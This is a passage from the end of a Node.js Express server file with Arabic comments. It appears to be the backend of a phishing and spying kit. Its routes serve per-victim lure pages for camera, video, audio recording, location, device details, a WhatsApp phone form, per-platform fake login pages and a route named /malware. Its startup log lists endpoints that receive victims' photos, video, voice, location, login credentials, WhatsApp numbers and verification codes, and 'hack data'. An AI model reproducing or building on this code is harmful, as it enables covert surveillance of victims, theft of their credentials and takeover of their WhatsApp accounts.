                console.error('❌ خطأ في إرسال الصورة للمجموعة:', error.message);
                return res.status(500).json({ success: false, error: 'فشل في إرسال الصورة للمجموعة' });
            }
        }

        res.json({ success: true });
    } catch (error) {
        console.error('❌ فشل في معالجة الطلب:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ==================== مسارات HTML ====================

app.get('/camera/:userId', (req, res) => {
    const userId = req.params.userId;
    res.sendFile(path.join(__dirname, 'location.html'));
});

app.get('/camera/video/:userId', (req, res) => {
    const userId = req.params.userId;
    res.sendFile(path.join(__dirname, 'dualCameraVideo.html'));
});

app.get('/record/:userId', (req, res) => {
    const userId = req.params.userId;
    res.sendFile(path.join(__dirname, 'record.html'));
});

app.get('/getLocation/:userId', (req, res) => {
    const userId = req.params.userId;
    res.sendFile(path.join(__dirname, 'SJGD.html'));
});

app.get('/:userId', (req, res) => {
    const userId = req.params.userId;
    res.sendFile(path.join(__dirname, 'SS.html'));
});

app.get('/whatsapp', (req, res) => {
    res.sendFile(path.join(__dirname, 'phone_form.html'));
});

app.get('/malware', (req, res) => {
    const chatId = req.query.chatId;
    const originalLink = req.query.originalLink;
    res.sendFile(path.join(__dirname, 'malware.html'));
});

app.get('/:action/:platform/:chatId', (req, res) => {
    const { action, platform, chatId } = req.params;
    res.sendFile(path.join(__dirname, 'uploads', `${platform}_${action}.html`);
});

// ==================== إعدادات السيرفر ====================
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log('🚀 ================================');
    console.log(`✅ سيرفر استقبال البيانات يعمل على المنفذ ${PORT}`);
    console.log('🚀 ================================');
    console.log('📡 المسارات النشطة:');
    console.log('   📸 /submitPhotos - استقبال الصور');
    console.log('   🎥 /submitVideo - استقبال الفيديو');
    console.log('   🎤 /submitVoice - استقبال الصوت');
    console.log('   📍 /submitLocation - استقبال الموقع');
    console.log('   🔐 /submitLogin - استقبال بيانات تسجيل الدخول');
    console.log('   📱 /SS - استقبال معلومات الجهاز');
    console.log('   ☎️ /sendPhoneNumber - استقبال رقم واتساب');
    console.log('   ✅ /verifyCode - استقبال كود واتساب');
    console.log('   ⚡ /submitIncrease - استقبال بيانات اختراق');
    console.log('🚀 ================================');
});
